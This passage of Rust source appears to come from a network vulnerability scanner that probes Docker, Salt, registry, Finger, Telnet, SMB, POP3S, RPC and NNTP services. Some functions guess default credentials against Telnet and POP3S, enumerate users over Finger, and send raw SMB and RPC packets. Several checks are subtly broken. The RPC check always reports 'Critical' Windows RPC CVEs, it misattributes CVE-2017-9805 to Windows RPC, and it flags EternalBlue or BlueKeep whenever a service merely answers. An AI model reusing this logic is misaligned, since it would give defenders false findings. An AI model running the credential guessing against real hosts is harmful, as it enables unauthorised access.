                            logs.push(format!("[FUZZ-DOCKER-DAEMON]  Found {} CVE(s) for Docker {}:", cves.len(), ver));
                            for (id, desc) in cves { logs.push(format!("[FUZZ-DOCKER-DAEMON]    • {} - {}", id, desc)); }
                        }
                    }
                }

                for api in ["/containers/json", "/images/json"] {
                    let url2 = if is_tls { format!("https://{}:{}{}", target, port, api) } else { format!("http://{}:{}{}", target, port, api) };
                    if let Ok(r) = client.get(&url2).send().await {
                        let s = r.status().as_u16();
                        logs.push(format!("[FUZZ-DOCKER-DAEMON] {} -> HTTP {}", api, s));
                        if s == 200 {
                            logs.push(format!("[FUZZ-DOCKER-DAEMON]  Unauthenticated access to {}", api));
                        }
                    }
                }
            } else if status == 401 || status == 403 {
                logs.push("[FUZZ-DOCKER-DAEMON] Auth required for API".into());
            } else {
                logs.push("[FUZZ-DOCKER-DAEMON] Unexpected response; may be behind proxy or TLS".into());
            }
        }
        Err(e) => {
            if is_tls {
                logs.push(format!("[FUZZ-DOCKER-DAEMON] TLS error: {}; mTLS likely required on 2376", e));
            } else {
                logs.push(format!("[FUZZ-DOCKER-DAEMON] Error connecting: {}", e));
            }
        }
    }

    Ok(logs)
}

/// Checks if Salt master ports are exposed; warns about CVE-2020-11651/11652.
async fn fuzz_saltstack_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push(format!("[FUZZ-SALTSTACK] Probing {}:{}", target, port));

    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    match TcpStream::connect(addr).await {
        Ok(_) => {
            logs.push("[FUZZ-SALTSTACK] Salt master port is reachable".into());
            logs.push("[FUZZ-SALTSTACK]  Publicly exposed Salt master is risky; consider network restrictions".into());
            logs.push("[FUZZ-SALTSTACK] CVEs: CVE-2020-11651 (auth bypass), CVE-2020-11652 (directory traversal)".into());
        }
        Err(e) => logs.push(format!("[FUZZ-SALTSTACK] Connection error: {}", e)),
    }

    Ok(logs)
}

/// Probes NPM/Verdaccio and Artifactory registries for anonymous access, package listings, and version CVEs.
async fn fuzz_registry_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push(format!("[FUZZ-REGISTRY] Probing {}:{}", target, port));

    let probes = vec!["/", "/-/whoami", "/-/v1/search?text=", "/-/verdaccio/packages", "/artifactory/api/system/version"];
    let (status_root, _body_root, headers_root) = try_http_or_https_get(target, port, probes[0]).await?;
    logs.push(format!("[FUZZ-REGISTRY] / -> HTTP {}", status_root));

    let server_hdr = headers_root.iter().find(|(k, _)| k.eq_ignore_ascii_case("server")).map(|(_, v)| v.clone());
    if let Some(s) = server_hdr.clone() {
        logs.push(format!("[FUZZ-REGISTRY] Server: {}", s));
        for (soft, ver) in parse_server_header(&s) {
            logs.push(format!("[FUZZ-REGISTRY] Detected: {} {}", soft, ver));
        }
    }

    let (st_who, body_who, _) = try_http_or_https_get(target, port, probes[1]).await?;
    logs.push(format!("[FUZZ-REGISTRY] /-/whoami -> HTTP {}", st_who));
    if st_who == 200 && body_who.to_lowercase().contains("not authenticated") {
        logs.push("[FUZZ-REGISTRY] Anonymous access present; check publish policies".into());
    }

    let (st_search, _, _) = try_http_or_https_get(target, port, probes[2]).await?;
    logs.push(format!("[FUZZ-REGISTRY] search API -> HTTP {}", st_search));

    let (st_list, body_list, _) = try_http_or_https_get(target, port, probes[3]).await?;
    logs.push(format!("[FUZZ-REGISTRY] verdaccio packages -> HTTP {}", st_list));
    if st_list == 200 {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body_list) {
            if let Some(pkgs) = json.as_array() {
                let names = pkgs.iter().filter_map(|x| x.get("name").and_then(|n| n.as_str())).collect::<Vec<_>>();
                if !names.is_empty() {
                    logs.push(format!("[FUZZ-REGISTRY] Packages: {:?}", names));
                }
            }
        }
    }

    let (st_art, body_art, _) = try_http_or_https_get(target, port, probes[4]).await?;
    logs.push(format!("[FUZZ-REGISTRY] Artifactory version API -> HTTP {}", st_art));
    if st_art == 200 {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body_art) {
            if let Some(ver) = json.get("version").and_then(|v| v.as_str()) {
                logs.push(format!("[FUZZ-REGISTRY] Artifactory version: {}", ver));
                let cves = get_cves_for_software("Artifactory", ver).await;
                if !cves.is_empty() {
                    logs.push(format!("[FUZZ-REGISTRY]  Found {} CVE(s) for Artifactory {}:", cves.len(), ver));
                    for (id, desc) in cves { logs.push(format!("[FUZZ-REGISTRY]    • {} - {}", id, desc)); }
                }
            }
        }
    }

    Ok(logs)
}

/// Tests Finger service for user enumeration and info disclosure.
async fn fuzz_finger_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push(format!("[FUZZ-FINGER] Probing {}:{}", target, port));
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    match TcpStream::connect(addr).await {
        Ok(mut stream) => {
            let _ = stream.write_all(b"\r\n");
            let mut buf = vec![0u8; 1024];
            if let Ok(n) = stream.read(&mut buf).await { if n > 0 { logs.push(format!("[FUZZ-FINGER] Listing: {}", String::from_utf8_lossy(&buf[..n]).trim())); } }

            for user in ["root", "admin", "test", "guest"] {
                let query = format!("{}\r\n", user);
                let _ = stream.write_all(query.as_bytes()).await;
                let mut resp = vec![0u8; 512];
                if let Ok(n) = stream.read(&mut resp).await {
                    if n > 0 {
                        logs.push(format!("[FUZZ-FINGER] {} -> {}", user, String::from_utf8_lossy(&resp[..n]).trim()));
                    }
                }
            }
            logs.push("[FUZZ-FINGER]  Finger service can leak user info; consider disabling".into());
        }
        Err(e) => logs.push(format!("[FUZZ-FINGER] Connection error: {}", e)),
    }
    Ok(logs)
}

async fn fuzz_telnet_auth(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;

    let creds = vec![
        ("admin", "admin"),
        ("root", "root"),
    ];

    let mut logs = Vec::new();

    for (user, pass) in creds {
        let payload = format!("{}\n{}\n", user, pass);
        stream.write_all(payload.as_bytes()).await?;

        let mut buf = [0u8; 512];
        let n = stream.read(&mut buf).await?;
        let resp = String::from_utf8_lossy(&buf[..n]);

        if resp.to_lowercase().contains("welcome") {
            logs.push(format!("[FUZZ-TELNET] Possible login {}:{}", user, pass));
        }
        if resp.to_lowercase().contains("login incorrect") {
            logs.push(format!("[FUZZ-TELNET] Invalid creds {}:{}", user, pass));
        }
    }

    Ok(logs)
}

/// Tests SMB for Samba/Windows version, null sessions, and known CVEs (EternalBlue, etc.).
async fn fuzz_smb_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SMB] Starting SMB vulnerability detection".into());

    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 1024];

        let smb_negotiate = [
            0xFF, 0x53, 0x4D, 0x42, // SMB signature
            0x72, 0x00, 0x00, 0x00, // Command: Negotiate
            0x00, 0x00, 0x00, 0x00, // Flags
            0x00, 0x00, // Flags2
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Reserved
            0x00, 0x00, // Tree ID
            0x00, 0x00, // Process ID
            0x00, 0x00, // User ID
            0x00, 0x00, // Multiplex ID
            0x01, // WordCount
            0x02, 0x02, // Dialects
        ];
        
        stream.write_all(&smb_negotiate).await?;
        
        let n = stream.read(&mut buf).await.unwrap_or(0);
        Ok::<Vec<u8>, std::io::Error>(buf[..n].to_vec())
    }.await;

    match result {
        Ok(response) => {
            if response.len() > 4 {
                let response_str = String::from_utf8_lossy(&response);
                
                if response_str.to_lowercase().contains("samba") {
                    logs.push("[FUZZ-SMB]  Samba detected".into());
                    
                    if let Some(version) = extract_samba_version(&response_str) {
                        logs.push(format!("[FUZZ-SMB] Version: {}", version));
                        
                        let cves = get_cves_for_software("Samba", &version).await;
                        if !cves.is_empty() {
                            logs.push(format!(
                                "[FUZZ-SMB]  Found {} CVE(s) for Samba {}:",
                                cves.len(),
                                version
                            ));
                            for (cve_id, description) in cves {
                                logs.push(format!(
                                    "[FUZZ-SMB]    • {} - {}",
                                    cve_id, description
                                ));
                            }
                        }
                    }
                } else {
                    logs.push("[FUZZ-SMB] Likely Windows SMB (not Samba)".into());
                }
            } else {
                logs.push("[FUZZ-SMB] Received minimal response, trying alternative detection".into());
            }
        }
        Err(_e) => {
            logs.push("[FUZZ-SMB] Error connecting to SMB service".into());
        }
    }

    let result2 = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let netbios_request = [
            0x81, 0x00, 0x00, 0x44, // Session Request
            0x20, 0x43, 0x4B, 0x46, // CKAACACACACACACACACACACACACACACA (encoded)
            0x44, 0x45, 0x4E, 0x45,
            0x43, 0x41, 0x43, 0x41,
            0x43, 0x41, 0x43, 0x41,
            0x43, 0x41, 0x43, 0x41,
            0x43, 0x41, 0x43, 0x41,
            0x43, 0x41, 0x43, 0x41,
            0x43, 0x41, 0x43, 0x41,
            0x20, 0x43, 0x41, 0x43,
            0x41, 0x43, 0x41, 0x43,
            0x41, 0x43, 0x41, 0x43,
            0x41, 0x43, 0x41, 0x43,
            0x41, 0x43, 0x41, 0x43,
            0x41, 0x43, 0x41, 0x00,
        ];
        
        stream.write_all(&netbios_request).await?;
        
        let mut buf = [0u8; 512];
        let n = stream.read(&mut buf).await.unwrap_or(0);
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf[..n]).to_string())
    }.await;

    match result2 {
        Ok(response2) => {
            let response_lower = response2.to_lowercase();
            
            if response_lower.contains("windows") || response_lower.contains("server") {
                if let Some(windows_version) = detect_windows_version(&response2) {
                    logs.push(format!("[FUZZ-SMB] Windows version detected: {}", windows_version));
                    
                    let cves = get_cves_for_software("Windows", &windows_version).await;
                    if !cves.is_empty() {
                        logs.push(format!(
                            "[FUZZ-SMB]  Found {} CVE(s) for Windows {}:",
                            cves.len(),
                            windows_version
                        ));
                        for (cve_id, description) in cves {
                            logs.push(format!(
                                "[FUZZ-SMB]    • {} - {}",
                                cve_id, description
                            ));
                        }
                    }
                }
            }
        }
        Err(_) => {}
    }

    logs.extend(test_smb_known_vulnerabilities(target, port).await?);

    Ok(logs)
}

fn extract_samba_version(response: &str) -> Option<String> {
    let patterns = vec![
        "Samba ",
        "samba-",
        "Samba/",
    ];
    
    for pattern in patterns {
        if let Some(pos) = response.to_lowercase().find(&pattern.to_lowercase()) {
            let after_pattern = &response[pos + pattern.len()..];
            let version_part: String = after_pattern
                .chars()
                .take_while(|c| c.is_numeric() || *c == '.')
                .collect();
            
            if !version_part.is_empty() {
                return Some(version_part);
            }
        }
    }
    
    None
}

fn detect_windows_version(response: &str) -> Option<String> {
    let response_lower = response.to_lowercase();
    
    if response_lower.contains("windows 10") {
        return Some("10".to_string());
    }
    if response_lower.contains("windows 7") {
        return Some("7".to_string());
    }
    if response_lower.contains("windows 8") {
        return Some("8".to_string());
    }
    if response_lower.contains("server 2019") {
        return Some("Server 2019".to_string());
    }
    if response_lower.contains("server 2016") {
        return Some("Server 2016".to_string());
    }
    if response_lower.contains("server 2012") {
        return Some("Server 2012".to_string());
    }
    if response_lower.contains("server 2008") {
        return Some("Server 2008".to_string());
    }
    if response_lower.contains("server 2003") {
        return Some("Server 2003".to_string());
    }
    
    None
}

async fn test_smb_known_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-SMB] Testing known SMB vulnerabilities".into());
    
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let negotiation = vec![
            0xFF, 0x53, 0x4D, 0x42, // SMB signature
            0x72, 0x00, 0x00, 0x00, // Command: Negotiate  
            0x00, 0x18, 0x53, 0xC8, // Flags
            0x00, 0x00, // Flags2
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x02, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x00, 0x02,
            0x4E, 0x54, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00,
        ];
        
        stream.write_all(&negotiation).await?;
        
        let mut buf = [0u8; 512];
        let n = stream.read(&mut buf).await.unwrap_or(0);
        Ok::<usize, std::io::Error>(n)
    }.await;
    
    match result {
        Ok(n) if n > 0 => {
            logs.push("[FUZZ-SMB]  SMB negotiation successful".into());
            logs.push("[FUZZ-SMB]  Potential EternalBlue vulnerability (CVE-2017-0144) - Service is responsive to SMB v1".into());
        }
        _ => {
            logs.push("[FUZZ-SMB] SMB v1 may be disabled or service not responsive".into());
        }
    }
    
    Ok(logs)
}

fn pop3s_common_credentials() -> Vec<(&'static str, &'static str)> {
    vec![
        ("admin", "admin"),
        ("user", "user"),
        ("test", "test"),
        ("postmaster", "postmaster"),
        ("root", "root"),
        ("administrator", "administrator"),
        ("guest", "guest"),
        ("mail", "mail"),
        ("admin", "password"),
        ("user", "password"),
    ]
}

fn pop3s_known_vulnerabilities() -> Vec<(&'static str, &'static str, &'static str, Vec<&'static str>)> {
    vec![
        ("Dovecot", "CVE-2014-3566", "POODLE - SSL 3.0 vulnerability (affects OpenSSL/GnuTLS backends)", vec!["1.0.0", "2.0.0", "2.1.0", "2.2.0"]),
        ("Dovecot", "CVE-2019-11500", "IMAP/POP3 RPA PLAIN authentication bypass", vec!["2.2.0", "2.3.0", "2.3.10"]),
        ("Dovecot", "CVE-2019-11499", "Denial of Service in NTLM/RPC", vec!["2.3.0", "2.3.9"]),
        ("Cyrus IMAPD", "CVE-2015-2912", "Message parsing vulnerability leading to DoS", vec!["1.5.0", "2.4.0", "2.5.0"]),
        ("Cyrus IMAPD", "CVE-2012-3817", "Uninitialized string variable in RFC 5051 collation", vec!["1.5.0", "2.3.0", "2.4.0"]),
        ("UW-IMAP", "CVE-2013-1664", "XML parser vulnerability (libxml2)", vec!["2007.0", "2007.5"]),
        ("Courier", "CVE-2011-2197", "Buffer overflow in SASL authentication", vec!["0.63.0", "0.64.0", "0.65.0"]),
    ]
}

async fn fuzz_pop3s_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    
    logs.push("[FUZZ-POP3S] Starting POP3S vulnerability detection".into());
    
    match test_pop3s_tls_config(target, port, ip).await {
        Ok(tls_logs) => logs.extend(tls_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3S] TLS test error: {}", e)),
    }
    
    match test_pop3s_weak_auth(target, port, ip).await {
        Ok(auth_logs) => logs.extend(auth_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3S] Auth test error: {}", e)),
    }
    
    match detect_pop3s_software_vulnerabilities(target, port, ip).await {
        Ok(vuln_logs) => logs.extend(vuln_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3S] Software detection error: {}", e)),
    }
    
    match test_pop3s_dangerous_commands(target, port, ip).await {
        Ok(cmd_logs) => logs.extend(cmd_logs),
        Err(e) => logs.push(format!("[FUZZ-POP3S] Command test error: {}", e)),
    }
    
    logs.push("[FUZZ-POP3S] Completed POP3S vulnerability scanning".into());
    Ok(logs)
}

async fn test_pop3s_tls_config(target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3S-TLS] Testing SSL/TLS configuration".into());
    
    let _addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(5000), TcpStream::connect(SocketAddr::new(ip, port))).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 256];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    
                    if banner.contains("OK") || banner.contains("+OK") {
                        logs.push("[FUZZ-POP3S-TLS]  POP3S Banner detected".into());
                        logs.push(format!("[FUZZ-POP3S-TLS] Banner: {}", banner.trim()));
                    }
                    
                    let mut stream_check = TcpStream::connect(SocketAddr::new(ip, port)).await?;
                    stream_check.write_all(b"STLS\r\n").await?;
                    let mut buf2 = [0u8; 256];
                    match stream_check.read(&mut buf2).await {
                        Ok(n) => {
                            let resp = String::from_utf8_lossy(&buf2[..n]);
                            if resp.contains("OK") || resp.contains("ready") {
                                logs.push("[FUZZ-POP3S-TLS]  STLS command supported (may allow downgrade attacks)".into());
                            }
                        }
                        Err(_) => {}
                    }
                }
                _ => {
                    logs.push("[FUZZ-POP3S-TLS]  Could not read TLS banner".into());
                }
            }
        }
        _ => {
            logs.push(format!("[FUZZ-POP3S] Cannot connect to {}:{}", target, port));
        }
    }
    
    Ok(logs)
}

async fn test_pop3s_weak_auth(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3S-AUTH] Testing weak authentication".into());
    
    let credentials = pop3s_common_credentials();
    let addr = SocketAddr::new(ip, port);
    
    for (user, pass) in credentials {
        match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let user_cmd = format!("USER {}\r\n", user);
                let _ = stream.write_all(user_cmd.as_bytes()).await;
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let pass_cmd = format!("PASS {}\r\n", pass);
                let _ = stream.write_all(pass_cmd.as_bytes()).await;
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("+OK") || resp.contains("authenticated") || resp.contains("logged in") {
                    logs.push(format!(
                        "[FUZZ-POP3S-AUTH]  WEAK CREDENTIAL FOUND: {}:{}",
                        user, pass
                    ));
                } else if resp.contains("-ERR") || resp.contains("authentication failed") {
                }
            }
            _ => {
                break;
            }
        }
    }
    
    Ok(logs)
}

async fn detect_pop3s_software_vulnerabilities(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3S-VULN] Detecting software vulnerabilities".into());
    
    let addr = SocketAddr::new(ip, port);
    
    match time::timeout(Duration::from_millis(3000), TcpStream::connect(addr)).await {
        Ok(Ok(mut stream)) => {
            let mut buf = [0u8; 512];
            match time::timeout(Duration::from_millis(1000), stream.read(&mut buf)).await {
                Ok(Ok(n)) if n > 0 => {
                    let banner = String::from_utf8_lossy(&buf[..n]);
                    let banner_lower = banner.to_lowercase();
                    
                    let detected_version = banner
                        .split_whitespace()
                        .find(|w| w.chars().filter(|c| c.is_digit(10) || *c == '.').count() > 1)
                        .unwrap_or("unknown");
                    
                    let known_vulns = pop3s_known_vulnerabilities();
                    let mut found_software = false;
                    
                    for (software, _, _, _) in known_vulns {
                        if banner_lower.contains(&software.to_lowercase()) {
                            found_software = true;
                            logs.push(format!(
                                "[FUZZ-POP3S-VULN]  Software detected: {}",
                                software
                            ));
                            
                            if detected_version != "unknown" {
                                logs.push(format!(
                                    "[FUZZ-POP3S-VULN]    Detected version: {}",
                                    detected_version
                                ));
                                
                                let applicable_cves = get_cves_for_software(software, detected_version).await;
                                
                                if !applicable_cves.is_empty() {
                                    logs.push(format!(
                                        "[FUZZ-POP3S-VULN]     Found {} vulnerabilities for this version:",
                                        applicable_cves.len()
                                    ));
                                    for (cve, description) in applicable_cves {
                                        logs.push(format!(
                                            "[FUZZ-POP3S-VULN]       • {} - {}",
                                            cve, description
                                        ));
                                    }
                                } else {
                                    logs.push("[FUZZ-POP3S-VULN]    No known vulnerabilities for this version".into());
                                }
                            } else {
                                logs.push("[FUZZ-POP3S-VULN]    Version not detected, cannot assess vulnerabilities".into());
                            }
                            break;
                        }
                    }
                    
                    if !found_software && detected_version != "unknown" {
                        logs.push(format!(
                            "[FUZZ-POP3S-VULN] Server version: {}",
                            detected_version
                        ));
                    }
                }
                _ => {
                    logs.push("[FUZZ-POP3S-VULN] Could not read software banner".into());
                }
            }
        }
        _ => {}
    }
    
    Ok(logs)
}

async fn test_pop3s_dangerous_commands(_target: &str, port: u16, ip: std::net::IpAddr) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push("[FUZZ-POP3S-CMD] Testing dangerous commands".into());
    
    let dangerous_commands = vec![
        ("APOP", "APOP test test"),
        ("SASL", "AUTH PLAIN"),
        ("CAPA", "CAPA"),
    ];
    
    let addr = SocketAddr::new(ip, port);
    
    for (cmd_name, cmd) in dangerous_commands {
        match time::timeout(Duration::from_millis(2000), TcpStream::connect(addr)).await {
            Ok(Ok(mut stream)) => {
                let mut buf = [0u8; 256];
                let _ = stream.read(&mut buf).await;
                
                let cmd_str = format!("{}\r\n", cmd);
                let _ = stream.write_all(cmd_str.as_bytes()).await;
                
                let n = stream.read(&mut buf).await.unwrap_or(0);
                let resp = String::from_utf8_lossy(&buf[..n]);
                
                if resp.contains("+OK") || resp.contains("AUTH") || resp.contains("SASL") {
                    if cmd_name == "APOP" {
                        logs.push("[FUZZ-POP3S-CMD] APOP authentication supported (vulnerable to MD5 collisions)".into());
                    } else if cmd_name == "SASL" && resp.contains("AUTH") {
                        logs.push("[FUZZ-POP3S-CMD] SASL authentication supported".into());
                    }
                }
            }
            _ => {}
        }
    }
    
    Ok(logs)
}

async fn fuzz_rpc_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-RPC] Starting RPC Endpoint Mapper vulnerability detection".into());

    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let mut buf = [0u8; 4096];
        
        let rpc_bind_request = [
            0x05, 0x00, // Version, VersionMinor
            0x0B, 0x03, // Command (BIND), Flags (FIRST_FRAG | LAST_FRAG)
            0x10, 0x00, 0x00, 0x00, // Representation (little-endian)
            0x48, 0x00, // Fragment length
            0x00, 0x00, // Auth length
            0x01, 0x00, 0x00, 0x00, // Call ID
            0xB8, 0x10, 0xB8, 0x10, // Max tx frag size
            0x10, 0x00, 0x00, 0x00, // Max rx frag size
            0xD8, 0x16, 0x00, 0x00, // Group ID
            0x04, 0x00, 0x00, 0x00, // Num ctxts
            0x00, 0x00, 0x00, 0x00, // Context 1 ID
            0x01, 0x00, 0x00, 0x00, // Num transfers
            0xe1, 0xaf, 0x8b, 0xb9, 0xa4, 0xa8, 0x11, 0xd1,
            0xb1, 0x2e, 0x00, 0x60, 0x97, 0xba, 0x4e, 0x00,
            0x02, 0x00, 0x00, 0x00, // UUID version
            0x00, 0x00, 0x00, 0x00, // Syntax version
        ];
        
        stream.write_all(&rpc_bind_request).await?;
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        Ok::<Vec<u8>, std::io::Error>(buf[..n].to_vec())
    }.await;

    match result {
        Ok(response) => {
            if response.len() > 0 {
                logs.push("[FUZZ-RPC]  RPC service responded to BIND request".into());
                
                if response.len() > 4 {
                    let version = response[0];
                    if version == 0x05 {
                        logs.push("[FUZZ-RPC] RPC Protocol version 5 detected (Windows RPC)".into());
                    }
                }
                
                detect_windows_rpc_version(&response, &mut logs);
            } else {
                logs.push("[FUZZ-RPC] No response to BIND request".into());
            }
        }
        Err(_e) => {
            logs.push("[FUZZ-RPC] Error connecting to RPC Endpoint Mapper service".into());
        }
    }

    test_rpc_null_session(target, port, &mut logs).await;
    test_rpc_known_vulnerabilities(target, port, &mut logs).await;
    enumerate_rpc_interfaces(target, port, &mut logs).await;

    Ok(logs)
}

fn detect_windows_rpc_version(response: &[u8], logs: &mut Vec<String>) {
    let response_str = String::from_utf8_lossy(response);
    
    if response.len() > 12 {
        if response[4] == 0x00 && response[5] == 0x00 {
            logs.push("[FUZZ-RPC-VER] Detected Windows RPC signature".into());
            
            if response_str.contains("Microsoft") || response_str.contains("Windows") {
                logs.push("[FUZZ-RPC-VER]  Windows system detected in RPC service".into());
            }
        }
    }

    let windows_rpc_cves = vec![
        "CVE-2019-0708",
        "CVE-2017-9805",
        "CVE-2018-0824",
    ];
    
    logs.push("[FUZZ-RPC-VER] Critical: Known Windows RPC vulnerabilities detected:".into());
    for cve in windows_rpc_cves {
        logs.push(format!("[FUZZ-RPC-VER]    • {} - Windows RPC Service vulnerability", cve));
    }
}

async fn test_rpc_null_session(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let null_session_request = [
            0x05, 0x00, // Version
            0x0C, 0x03, // Command (FAULT), Flags
            0x10, 0x00, 0x00, 0x00, // Representation
            0x28, 0x00, // Fragment length
            0x00, 0x00, // Auth length
            0x01, 0x00, 0x00, 0x00, // Call ID
        ];
        
        stream.write_all(&null_session_request).await?;
        
        let mut buf = [0u8; 256];
        let n = stream.read(&mut buf).await.unwrap_or(0);
        Ok::<bool, std::io::Error>(n > 0)
    }.await;

    match result {
        Ok(true) => {
            logs.push("[FUZZ-RPC-NULL] CRITICAL: RPC service accessible with NULL session (unauthenticated)".into());
            logs.push("[FUZZ-RPC-NULL] This allows enumeration of RPC interfaces and potential exploitation".into());
        }
        _ => {
            logs.push("[FUZZ-RPC-NULL] RPC appears to require authentication".into());
        }
    }
}

async fn test_rpc_known_vulnerabilities(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
        
    let test_payloads = vec![
        ("EternalRomance", "SMB/RPC vulnerability in Windows"),
        ("EternalBlue", "SMBv1 RPC exploitation vector"),
        ("BlueKeep", "RDP/RPC pre-authentication RCE (CVE-2019-0708)"),
    ];
    
    for (name, description) in test_payloads {
        match async {
            let mut stream = TcpStream::connect(addr).await?;
            
            let mut buf = [0u8; 512];
            
            let rpc_packet = [
                0x05, 0x00, // Version, VersionMinor
                0x03, 0x03, // Command (REQUEST), Flags
                0x10, 0x00, 0x00, 0x00, // Representation
                0x08, 0x00, // Fragment length  
                0x00, 0x00, // Auth length
                0x01, 0x00, 0x00, 0x00, // Call ID
            ];
            
            stream.write_all(&rpc_packet).await?;
            
            let n = tokio::time::timeout(
                std::time::Duration::from_secs(2),
                stream.read(&mut buf)
            ).await.unwrap_or(Ok(0))?;
            Ok::<bool, std::io::Error>(n > 0)
        }.await {
            Ok(true) => {
                logs.push(format!(
                    "[FUZZ-RPC-VULN]  RPC service accepts REQUEST packets (potential {} vulnerability): {}",
                    name, description
                ));
            }
            _ => {
                logs.push(format!(
                    "[FUZZ-RPC-VULN]  Testing for {}: potentially protected",
                    name
                ));
            }
        }
    }
}

async fn enumerate_rpc_interfaces(target: &str, port: u16, logs: &mut Vec<String>) {
    let ip = match resolve_host(target).await {
        Ok(ip) => ip,
        Err(_) => return,
    };
    
    let addr = SocketAddr::new(ip, port);
    
    logs.push("[FUZZ-RPC-ENUM] Attempting to enumerate RPC interfaces...".into());
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        
        let lookup_request = [
            0x05, 0x00, // Version
            0x0C, 0x03, // Command (REQUEST based on epmapper)
            0x10, 0x00, 0x00, 0x00, // Representation
            0x10, 0x00, // Fragment length
            0x00, 0x00, // Auth length
            0x02, 0x00, 0x00, 0x00, // Call ID
        ];
        
        stream.write_all(&lookup_request).await?;
        
        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        Ok::<usize, std::io::Error>(n)
    }.await;

    match result {
        Ok(n) if n > 0 => {
            logs.push("[FUZZ-RPC-ENUM]  Received RPC enumeration response".into());
            logs.push("[FUZZ-RPC-ENUM]  RPC Endpoint Mapper is allowing interface enumeration".into());
            logs.push("[FUZZ-RPC-ENUM]    Enumerated interfaces could reveal additional attack vectors".into());
        }
        _ => {
            logs.push("[FUZZ-RPC-ENUM]  RPC interface enumeration appears restricted".into());
        }
    }
}

async fn fuzz_nntp_vulnerabilities(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-NNTP] Starting NNTP vulnerability detection".into());

    let addr = SocketAddr::new(ip, port);
    
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 1024];
        
        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf)
        ).await.unwrap_or(Ok(0))?;
        
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf[..n]).to_string())
    }.await;

    match result {
        Ok(response) => {
            logs.push("[FUZZ-NNTP]  NNTP service responded with banner".into());
            
            if response.contains("NNTP") || response.contains("news") {
                logs.push(format!("[FUZZ-NNTP] Banner: {}", response.lines().next().unwrap_or("").trim()));
                
                if let Some(version) = extract_nntp_version(&response) {
                    logs.push(format!("[FUZZ-NNTP] Version: {}", version));
                    
                    let cves = get_cves_for_software("NNTP", &version).await;
                    if !cves.is_empty() {
